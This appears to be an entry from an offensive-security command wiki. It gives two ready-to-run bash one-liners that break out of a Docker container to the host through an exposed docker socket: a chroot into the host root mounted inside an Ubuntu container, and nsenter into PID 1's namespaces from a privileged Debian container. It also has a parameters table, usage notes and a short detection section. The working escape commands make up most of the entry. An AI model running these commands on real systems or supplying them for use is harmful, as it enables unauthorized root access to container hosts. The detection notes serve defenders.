---
id: 2d3bc7a4-b3b0-4151-9902-68ba2f1a5f1b
name: docker-chroot-nsenter-host-escape
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:19.469234+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - docker
  - container-escape
  - namespace
validated: true
---

# docker-chroot-nsenter-host-escape

## Code

```bash
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

## Description

This bash code contains two commands for escaping Docker containers to the host: one using chroot in an Ubuntu container to mount and switch to the host root, and another using nsenter in a privileged Debian container to join host namespaces. The -H flag targets a specific socket path (e.g., in cloud environments like GKE); adjust for standard /var/run/docker.sock.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| unix:///google/host/var/run/docker.sock | Docker socket path (customize for environment) | unix:///var/run/docker.sock |
| /host | Mount point for host filesystem | /host |
| 1 | Target PID for nsenter (init process) | 1 |

## Usage

Run the first command for filesystem-based escape, the second for namespace-based. Ideal for environments with restricted socket access. Used in [[procedures/Linux-Docker-Privilege-Escalation]] for advanced host entry.

## Detection

- Logs of docker run with -H custom socket, --privileged, or chroot/nsenter execution.
- Syscall monitoring for unshare/setns (namespace changes).
- Container runtime security tools like Falco alerting on privilege escalations.

## Related

- [[procedures/Linux-Docker-Privilege-Escalation]]
- [[commands/docker-ubuntu-chroot-host-shell]]
- [[commands/docker-debian-nsenter-host-shell]]
